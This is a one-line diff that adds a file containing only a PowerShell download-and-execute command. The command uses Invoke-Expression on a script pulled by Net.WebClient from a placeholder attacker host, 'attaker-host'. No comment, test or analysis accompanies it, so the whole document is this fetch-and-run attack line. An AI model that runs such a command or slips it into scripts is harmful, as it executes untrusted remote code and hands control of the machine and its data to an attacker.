@@ -1,0 +1,1 @@
+﻿Invoke-Expression( New-Object Net.webclient).DownloadString("http://attaker-host/script.ps1")
